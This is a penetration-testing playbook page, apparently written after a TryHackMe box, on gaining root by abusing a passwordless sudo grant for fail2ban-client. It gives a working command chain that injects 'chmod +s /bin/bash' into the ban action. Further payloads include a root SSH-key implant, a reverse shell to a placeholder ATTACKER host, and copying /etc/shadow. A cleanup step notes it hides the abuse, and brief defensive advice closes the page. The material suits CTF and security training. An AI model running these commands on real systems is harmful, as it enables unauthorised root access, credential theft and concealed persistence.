# Sudo `fail2ban-client`  Root

When `sudo -l` allows a non-root user to run `fail2ban-client` without a password, the ban-action template can be overwritten so the next ban runs arbitrary code as root. The canonical payload is `chmod +s /bin/bash`, turning bash into a SUID root shell.

**Used on:** **Billing** (TryHackMe)

---

## 1. Prerequisites

- Shell as a non-root user (e.g. `asterisk`).
- `sudo -l` permits `/usr/bin/fail2ban-client` without password.
- At least one existing jail (commonly `sshd`).

### Check
<!-- cmd: linux -->
```bash
sudo -l
# Matching Defaults entries for asterisk on HOST:
#     env_reset, mail_badpass, secure_path=...
# Runas and Command-specific defaults for asterisk:
#     Defaults!/usr/bin/fail2ban-client !requiretty
# User asterisk may run the following commands on HOST:
#     (root) NOPASSWD: /usr/bin/fail2ban-client
```

If no explicit jail is visible, list them:
<!-- cmd: linux -->
```bash
sudo /usr/bin/fail2ban-client status
# Jail list: sshd
```

---

## 2. Why it Works

`fail2ban-client set <jail> action <action> actionban "<cmd>"` overwrites the `actionban` script the action uses when it bans an IP. `fail2ban-server` runs as **root**, so when the action fires (any `banip`), the injected command executes as root.

Key nuance: the `actionban` value is a shell snippet passed to `/bin/sh -c`. No escaping, no allow-list.

---

## 3. Exploitation

<!-- cmd: linux -->
```bash
# 1. Overwrite the ban action for the sshd jail
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
  actionban "chmod +s /bin/bash"

# 2. Trigger it by banning an arbitrary IP
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.4

# 3. Verify bash is now SUID root
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash

# 4. Pop a privileged shell — `-p` preserves the elevated EUID
bash -p
whoami          #  root
id
cat /root/root.txt
```

The whole chain runs in under five seconds.

---

## 4. Alternative Payloads

Instead of SUID bash, any root command works:

<!-- cmd: linux -->
```bash
# Drop an SSH key for root
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
  actionban "echo '<YOUR_PUBKEY>' >> /root/.ssh/authorized_keys"
sudo /usr/bin/fail2ban-client set sshd banip 2.3.4.5

# Reverse shell callback
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
  actionban "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
sudo /usr/bin/fail2ban-client set sshd banip 3.4.5.6

# Read /etc/shadow once
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
  actionban "cat /etc/shadow > /tmp/shadow.txt; chmod 644 /tmp/shadow.txt"
sudo /usr/bin/fail2ban-client set sshd banip 4.5.6.7
```

---

## 5. Cleanup

Restore the legitimate actionban to avoid breaking fail2ban on the target (and to hide the abuse):

<!-- cmd: linux -->
```bash
sudo /usr/bin/fail2ban-client set sshd unbanip 1.2.3.4
sudo /usr/bin/fail2ban-client reload
```

Restoring the exact `actionban` string requires reading `/etc/fail2ban/action.d/iptables-multiport.conf` first — usually out of scope for CTF, relevant for engagements.

---

## 6. Defensive Notes

- Never grant non-root users sudo on `fail2ban-client` — it is effectively sudo-to-arbitrary-command.
- If a service account must reload jails, wrap a specific sub-command in a sudo-allowed helper script rather than exposing the full client.

---

## Related
- [magnusbilling-rce.md](../web-rce/magnusbilling-rce.md) — common way to land the `asterisk` user on this configuration
- [linux-enumeration.md](../enumeration/linux-enumeration.md) — `sudo -l` is step 4 of the playbook


